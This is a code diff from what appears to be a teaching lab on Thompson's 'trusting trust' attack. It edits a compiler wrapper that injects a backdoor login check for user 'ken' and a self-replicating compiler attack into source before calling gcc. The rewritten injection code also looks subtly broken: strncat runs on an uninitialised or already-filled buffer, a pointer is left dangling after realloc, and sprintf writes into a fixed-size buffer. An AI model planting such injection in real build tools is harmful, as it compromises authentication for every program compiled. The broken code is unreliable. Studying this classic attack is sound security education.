@@ -30,93 +30,56 @@ static void compile(char *program, char *outname) {
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
     /* your code goes here */
-    char *prog = program;
-    unsigned bytes_needed = strlen(prog) + 1;
-    char *hacked_prog = calloc(bytes_needed, 1);
-    char *end = hacked_prog;
+    char *hacked_prog = 0;
+    unsigned hacked_prog_len = strlen(program) + 1;
 
-    char *login_start = strstr(prog, login_sig);
+    char *login_start = strstr(program, login_sig);
     if (login_start) {
-        // inject `\n\t<login_attack>\n`
-        char *attack_prefix = "\n\t";
-        char *attack_suffix = "\n";
-        bytes_needed += strlen(attack_prefix) + strlen(login_attack) + strlen(attack_suffix);
-        hacked_prog = realloc(hacked_prog, bytes_needed);
-        end = hacked_prog;
+        hacked_prog_len += strlen(login_attack);
+        hacked_prog = calloc(hacked_prog_len, sizeof(char));
 
-        // copy prefix
+        // insert prefix
         char *login_end = login_start + strlen(login_sig);
-        unsigned prefix_len = login_end - prog;
-        memcpy(end, prog, prefix_len);
-        end += prefix_len;
+        strncat(hacked_prog, program, login_end - program);
 
-        // inject attack
-        memcpy(end, attack_prefix, strlen(attack_prefix));
-        end += strlen(attack_prefix);
-        memcpy(end, login_attack, strlen(login_attack));
-        end += strlen(login_attack);
-        memcpy(end, attack_suffix, strlen(attack_suffix));
-        end += strlen(attack_suffix);
+        // insert attack
+        strcat(hacked_prog, login_attack); 
 
-        // copy suffix
-        unsigned suffix_len = prog + strlen(prog) - login_end;
-        memcpy(end, login_end, suffix_len);
-        end += suffix_len;
-        *end = 0;
-
-        // copy hacked_prog into prog
-        prog = calloc(strlen(hacked_prog), 1);
-        strcpy(prog, hacked_prog);
+        // insert suffix
+        strcat(hacked_prog, login_end);
+        
+        program = hacked_prog;
     }
 
-    char *compile_start = strstr(prog, compile_sig);
+    char *compile_start = strstr(program, compile_sig);
     if (compile_start) {
-        // inject `\n\t<compile_attack>\n`
-        char *attack_prefix = "\n\t"; 
-        char *attack_suffix = "\n"; 
-        bytes_needed += strlen(attack_prefix) + strlen(compile_attack) + strlen(attack_suffix);
-        hacked_prog = realloc(hacked_prog, bytes_needed);
-        end = hacked_prog;
+        hacked_prog_len += strlen(compile_attack);
+        hacked_prog = realloc(hacked_prog, hacked_prog_len);
 
-        // copy prefix
+        // insert prefix
         char *compile_end = compile_start + strlen(compile_sig);
-        unsigned prefix_len = compile_end - prog;
-        memcpy(end, prog, prefix_len);
-        end += prefix_len;
+        strncat(hacked_prog, program, compile_end - program);
 
-        // inject attack
-        memcpy(end, attack_prefix, strlen(attack_prefix));
-        end += strlen(attack_prefix);
-        memcpy(end, compile_attack, strlen(compile_attack));
-        end += strlen(compile_attack);
-        memcpy(end, attack_suffix, strlen(attack_suffix));
-        end += strlen(attack_suffix);
+        // insert attack
+        strcat(hacked_prog, compile_attack);
 
-        // copy suffix
-        unsigned suffix_len = prog + strlen(prog) - compile_end;
-        memcpy(end, compile_end, suffix_len);
-        end += suffix_len;
-        *end = 0;
+        // insert suffix
+        strcat(hacked_prog, compile_end);
 
-        // copy hacked_prog into prog
-        if (login_start)
-            free(prog);
-        prog = calloc(strlen(hacked_prog), 1);
-        strcpy(prog, hacked_prog);
+        program = hacked_prog;
     }
-
-
-    fprintf(fp, "%s", prog);
+    
+    fprintf(fp, "%s", program);
     fclose(fp);
+
+    if (hacked_prog)
+        free(hacked_prog);
 
     // gross, call gcc.
     char buf[1024];
     sprintf(buf, "gcc ./temp-out.c -o %s", outname);
     if(system(buf) != 0)
         error("system failed\n");
-    
-    if (login_start || compile_start)
-        free(prog);
 }
 
 #   define N  8 * 1024 * 1024
